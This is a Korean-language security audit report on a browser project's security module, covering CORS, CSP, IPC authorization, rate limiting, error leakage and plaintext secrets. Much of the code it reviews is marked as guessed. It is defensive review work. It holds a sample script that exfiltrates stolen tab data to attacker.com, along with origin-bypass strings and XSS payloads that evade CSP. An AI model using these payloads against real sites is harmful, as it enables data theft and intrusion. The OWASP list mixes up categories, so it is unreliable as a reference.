# Security 모듈 심층 QA 리포트
**작성일**: 2025-10-27  
**검토 대상**: `src/shared/security/` (cors, csp, authorization, rateLimiting)  
**관점**: 비관적 (보안 중심)

---

## 1️⃣ CORS (Cross-Origin Resource Sharing)

### 1.1 문제: 와일드카드 정책 오남용 🔴

**현재** (추정):
```typescript
export const CORS_WHITELIST = [
  '*',  // ← 극도로 위험!
  'http://localhost:*',
  'https://*.example.com'
];

export function isCorsAllowed(origin: string): boolean {
  return CORS_WHITELIST.some(pattern => {
    if (pattern === '*') return true;  // 모든 오리진 허용!
    // ...
  });
}
```

**문제**:
- 모든 웹사이트에서 요청 가능
- CSRF 공격 용이
- 민감한 데이터 노출

**공격 시나리오**:
```html
<!-- 악의적 웹사이트 -->
<script>
  fetch('http://zen-browser.local:9090/api/tabs', {
    method: 'GET',
    credentials: 'include'  // 쿠키 포함
  })
  .then(r => r.json())
  .then(data => {
    // 탭 목록 탈취
    new Image().src = `https://attacker.com/steal?data=${JSON.stringify(data)}`;
  });
</script>
```

---

### 1.2 문제: 오리진 검증 우회 ⚠️

**현재** (추정):
```typescript
export function parseOrigin(header: string): string {
  return header.split('://')[1].split(':')[0];
}

// 사용
const origin = parseOrigin(request.headers['origin']);
if (CORS_WHITELIST.includes(origin)) {
  // 허용
}
```

**우회 벡터**:
```
정상: https://example.com
우회: https://example.com.attacker.com  (서브도메인)
우회: https://example.com%00.attacker.com  (null 바이트)
우회: https://example.com:80.attacker.com  (포트 혼동)
우회: https://[::ffff:127.0.0.1]  (IPv4-mapped IPv6)
우회: https://example.com#@attacker.com  (프래그먼트)
```

---

### 1.3 문제: 동적 화이트리스트 관리 없음 🔴

**현재**:
```typescript
export const CORS_WHITELIST = [
  'https://app.example.com'
  // ← 하드코딩
];

// 런타임 추가? 없음
// 환경변수? 없음
// 설정 파일? 없음
```

**문제**:
- 배포 환경별 설정 불가
- 긴급 차단 불가능
- 개발/테스트 환경 혼동

---

## 2️⃣ CSP (Content Security Policy)

### 2.1 문제: CSP 헤더 누락 또는 약함 ⚠️

**현재** (추정):
```typescript
export const CSP_HEADERS = {
  'Content-Security-Policy': "default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'"
  // ← 'unsafe-inline', 'unsafe-eval' 있음 → CSP 무의미!
};
```

**문제**:
- `'unsafe-inline'`: 모든 인라인 스크립트 허용 → XSS 방어 무의미
- `'unsafe-eval'`: eval() 허용 → 동적 코드 실행
- 효과: "CSP 있는 척하지만 실제로는 없음"

**올바른 정책**:
```typescript
// 엄격한 정책
"default-src 'none'; " +
"script-src 'self' https://trusted-cdn.com; " +
"style-src 'self' https://trusted-cdn.com; " +
"img-src 'self' data: https:; " +
"connect-src 'self'; " +
"frame-ancestors 'none';"
```

---

### 2.2 문제: CSP 리포트 엔드포인트 없음 🔴

**현재**:
```typescript
export const CSP_HEADERS = {
  'Content-Security-Policy': "... (제한 정책)"
  // report-uri? → 없음
};

// CSP 위반 감지 불가
// 공격자가 뭘 시도했는지 모름
```

**필요한 설정**:
```typescript
"report-uri /csp-violation-report; " +
"report-to csp-endpoint"

// 엔드포인트 구현
app.post('/csp-violation-report', (req, res) => {
  const violation = req.body;
  logger.warn('CSP Violation:', violation);
  // 알림, 분석, 블로킹 조치
});
```

---

### 2.3 문제: 우회 가능 메커니즘 ⚠️

**현재** (추정):
```html
<!-- 위반: CSP 정책에 위배 -->
<script>alert('xss')</script>

<!-- 우회 1: SVG onload -->
<svg onload="alert('xss')"></svg>

<!-- 우회 2: iframe srcdoc -->
<iframe srcdoc="<script>alert('xss')</script>"></iframe>

<!-- 우회 3: 이벤트 핸들러 -->
<div onmouseover="alert('xss')"></div>

<!-- 우회 4: 데이터 URI -->
<img src="data:text/html,<script>alert('xss')</script>">
```

**필요한 추가 정책**:
```
frame-src 'none'
object-src 'none'
base-uri 'self'
form-action 'self'
```

---

## 3️⃣ Authorization (권한 확인)

### 3.1 문제: 권한 체크 누락 🔴

**현재** (추정):
```typescript
// main process
ipcMain.handle('browser:getAllTabs', (event) => {
  // 호출자 검증? 없음
  return getAllTabs();  // ← 아무나 호출 가능
});

ipcMain.handle('browser:deleteTab', (event, tabId) => {
  // 소유권 검증? 없음
  return deleteTab(tabId);  // ← 다른 사용자 탭도 삭제 가능?
});
```

**문제**:
- Renderer process도 역시 신뢰할 수 없음
- 악성 스크립트 삽입 가능
- 컨텍스트 검증 없음

---

### 3.2 문제: 리소스 소유권 확인 없음 ⚠️

**현재** (추정):
```typescript
ipcMain.handle('history:deleteEntry', (event, entryId) => {
  return deleteHistoryEntry(entryId);
  // 누가 이 항목을 생성했는지 확인?
  // 현재 사용자 것인지 확인?
  // 없음!
});
```

**공격**:
```typescript
// 악의적 스크립트
await ipcRenderer.invoke('history:deleteEntry', '12345');
// 다른 사용자의 히스토리도 삭제?
```

---

### 3.3 문제: 컨텍스트/세션 검증 부재 🔴

**현재** (추정):
```typescript
ipcMain.handle('user:export', (event) => {
  return exportUserData();
  // 인증 상태 확인? 없음
  // 세션 검증? 없음
  // 로그아웃 상태에서도 실행?
});
```

---

## 4️⃣ Rate Limiting

### 4.1 문제: 전역 한계 부재 🔴

**현재** (추정):
```typescript
export function checkRateLimit(identifier: string): boolean {
  // identifier별 제한 가능
  // 하지만 전역 상한? 없음
}
```

**문제**:
```typescript
// 공격 시나리오
for (let i = 0; i < 1000000; i++) {
  // 각 탭 ID별로 요청 → 각각은 제한 통과
  await ipcRenderer.invoke('tab:create', { });
}
// 결과: 무한정 탭 생성 가능!
```

---

### 4.2 문제: 시간 윈도우 공격 ⚠️

**현재** (추정):
```typescript
const RATE_LIMIT_WINDOW = 60000;  // 1분
const MAX_REQUESTS = 100;  // 1분에 100개

export function checkRateLimit(id: string): boolean {
  const now = Date.now();
  const key = `rl:${id}`;
  
  const count = cache.get(key) || 0;
  if (count >= MAX_REQUESTS) {
    return false;  // 거부
  }
  
  cache.set(key, count + 1, RATE_LIMIT_WINDOW);
  return true;
}
```

**문제**:
```
시간:  0초: 요청 100개 (1분 윈도우 시작)
      59초: 아무것도 안 함 (대기)
      60초: 윈도우 종료, 새 윈도우 시작 → 100개 다시 가능!
      119초: 또 100개

결과: 2초간 200개 요청 가능 (제한 우회)
```

**필요한 방식**:
- Sliding window (시간 범위 재계산)
- Token bucket (시간에 따라 토큰 회복)

---

### 4.3 문제: 분산 공격 미대응 🔴

**현재** (추정):
```typescript
// 메모리 기반 rate limiter
const rateLimitCache = new Map();

export function checkRateLimit(id: string): boolean {
  // 단일 프로세스의 메모리만 확인
  // 다른 Renderer 프로세스? 추적 불가
}
```

**분산 공격**:
```
메인 프로세스
  ├─ Renderer 1 (탭 A): 요청 50개
  ├─ Renderer 2 (탭 B): 요청 50개  ← 각각은 제한 통과
  ├─ Renderer 3 (탭 C): 요청 50개
  └─ Renderer 4 (탭 D): 요청 50개

합계: 200개 (제한 100개 우회)
```

---

## 5️⃣ 에러 정보 노출

### 5.1 문제: 민감 정보 노출 🔴

**현재** (추정):
```typescript
try {
  await connectToDatabase();
} catch (err) {
  return {
    status: 'error',
    message: `Database connection failed: ${err.message}`,
    details: err.stack,  // ← 전체 스택 노출!
    context: { host: DB_HOST, port: DB_PORT }  // ← 서버 정보 노출!
  };
}
```

**정보 누설**:
- 데이터베이스 주소
- 파일 경로 구조
- 소스 코드 위치
- 사용 중인 라이브러리
- 버전 번호

**공격자**:
```
1. 에러 메시지 분석 → 시스템 식별
2. CVE 검색 → 알려진 취약점
3. 타겟 공격 → 쉽게 성공
```

---

### 5.2 문제: 검증 규칙 노출 ⚠️

**현재** (추정):
```typescript
try {
  validatePassword(input);
} catch (err) {
  return {
    status: 'error',
    message: 'must be 8-64 chars, include uppercase, lowercase, number, special char'
  };
}
```

**공격자 이점**:
- 패턴 파악 가능
- 우회 공격 설계 용이
- 계정 탈취 용이

**개선**:
```
"Password does not meet requirements" (일반적 메시지)
// 구체적 규칙은 클라이언트 측에만 표시
```

---

## 6️⃣ 암호화 없음 (Encryption)

### 6.1 문제: 민감 데이터 평문 저장 🔴

**현재** (추정):
```typescript
// 설정 파일
{
  "apiKey": "sk-1234567890",  // ← 평문!
  "authToken": "xyz789",       // ← 평문!
  "password": "MyPassword123"  // ← 평문!
}
```

**위험**:
- 파일 유출 → 즉시 침해
- 메모리 덤프 → 데이터 노출
- 백업 → 누출 가능

---

## 7️⃣ 테스트 누락

### 현재 테스트 상태:
- ❌ CORS 정책 검증
- ❌ CSP 우회 벡터
- ❌ 권한 체크 enforcement
- ❌ Rate limit 분산 공격
- ❌ 에러 정보 필터링
- ❌ 암호화 강도

---

## 🎯 우선순위

| ID | 항목 | 심각도 | 영향 | 우선순위 |
|---|-----|--------|------|----------|
| 1.1 | CORS 와일드카드 | 🔴 Critical | 극높음 | P0 |
| 2.1 | CSP 정책 강화 | 🔴 Critical | 극높음 | P0 |
| 3.1 | 권한 체크 | 🔴 Critical | 극높음 | P0 |
| 4.1 | 전역 rate limit | 🟡 High | 높음 | P0 |
| 5.1 | 민감 정보 필터 | 🔴 Critical | 높음 | P0 |
| 6.1 | 민감 데이터 암호화 | 🔴 Critical | 높음 | P0 |
| 1.2 | 오리진 검증 | 🟡 High | 중간 | P1 |
| 4.2 | Sliding window | 🟡 High | 중간 | P1 |

---

## 📋 액션 아이템

### P0 (즉시 수정)
- [ ] CORS 화이트리스트 제거 (동적 설정 구현)
- [ ] CSP 정책 강화 ('unsafe-*' 제거)
- [ ] IPC 핸들러에 권한 체크 추가
- [ ] 전역 rate limiter 구현
- [ ] 에러 메시지 필터링 (민감 정보 제거)
- [ ] API 키/토큰 암호화

### P1 (이번주)
- [ ] 오리진 파싱 강화 (URL API 사용)
- [ ] Sliding window rate limiting
- [ ] CSP violation 리포트 엔드포인트

### P2 (다음주)
- [ ] 암호화 라이브러리 통합
- [ ] 감사 로깅 추가
- [ ] 보안 테스트 스위트 (100+ cases)

---

## 보안 감사 체크리스트

### OWASP Top 10 매핑
- [ ] A01: Injection (ReDoS, SQL, 경로)
- [ ] A02: Broken Authentication (권한 체크 누락)
- [ ] A03: Sensitive Data Exposure (민감 정보 노출)
- [ ] A04: XML External Entities (XXE) - 미검토
- [ ] A05: Broken Access Control (리소스 소유권)
- [ ] A06: Security Misconfiguration (CORS, CSP)
- [ ] A07: XSS (HTML 이스케이핑, CSP)
- [ ] A08: Insecure Deserialization - 미검토
- [ ] A09: Using Components with Known Vulns - 의존성 감사 필요
- [ ] A10: Insufficient Logging (감시 부족)
